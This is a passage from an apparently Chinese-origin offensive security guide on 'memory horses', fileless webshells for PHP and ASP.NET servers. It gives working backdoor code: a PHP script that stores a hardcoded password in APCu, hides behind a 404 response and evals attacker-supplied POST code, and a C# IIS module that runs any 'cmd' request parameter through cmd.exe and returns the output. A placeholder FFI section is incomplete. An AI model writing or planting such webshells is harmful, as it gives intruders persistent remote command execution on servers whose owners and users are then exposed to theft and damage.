### 6.5 PHP Memory Horse

PHP memory horses are more challenging but possible through PHP-FPM process manipulation or shared memory.

**PHP 7.4+ FFI-based memory horse:**

```php
<?php
// PHP FFI (Foreign Function Interface) memory horse
// Requires PHP 7.4+ with FFI enabled
$ffi = FFI::cdef("
    typedef struct {
        // ... PHP internal structures
    } zend_execute_data;
    // ...
", "libphp.so");

// Hook into the PHP execution pipeline
// This is highly version-dependent and requires deep knowledge of PHP internals
// Real implementation would need to match exact PHP version structures
?>
```

**PHP-FPM persistent process abuse:**

```php
<?php
// PHP-FPM keeps processes alive between requests
// Store state in shared memory or APCu
$key = 'memhorse_' . md5(__FILE__);
if (apcu_exists($key)) {
    $config = apcu_fetch($key);
    if (isset($_POST['pass']) && $_POST['pass'] === $config['pass']) {
        eval($_POST['code']);
    }
} else {
    // First run: store configuration
    apcu_store($key, [
        'pass' => 'admin2026',
        'created' => time(),
        'file' => __FILE__,
    ]);
    // Return 404 on first access
    http_response_code(404);
    exit;
}
?>
```

### 6.6 ASP.NET Memory Horse

**ASP.NET IIS Module injection via C#:**

```csharp
// ASP.NET Memory Horse via GAC assembly injection
using System;
using System.Web;
using Microsoft.Web.Administration;

public class MemoryModule : IHttpModule
{
    public void Init(HttpApplication context)
    {
        context.BeginRequest += new EventHandler(OnBeginRequest);
    }

    void OnBeginRequest(object sender, EventArgs e)
    {
        HttpApplication app = (HttpApplication)sender;
        HttpContext ctx = app.Context;
        string cmd = ctx.Request.Params["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            ctx.Response.Write(p.StandardOutput.ReadToEnd());
            ctx.Response.End();
        }
    }

    public void Dispose() { }
}

// Dynamic registration via ServerManager
using (ServerManager serverManager = new ServerManager())
{
    var config = serverManager.GetApplicationHostConfiguration();
    var modulesSection = config.GetSection("system.webServer/modules");
    // Add module to the pipeline
    // This requires admin privileges on IIS
}
```

---



---
📖 本切片 3/3 结束。 本章节结束。
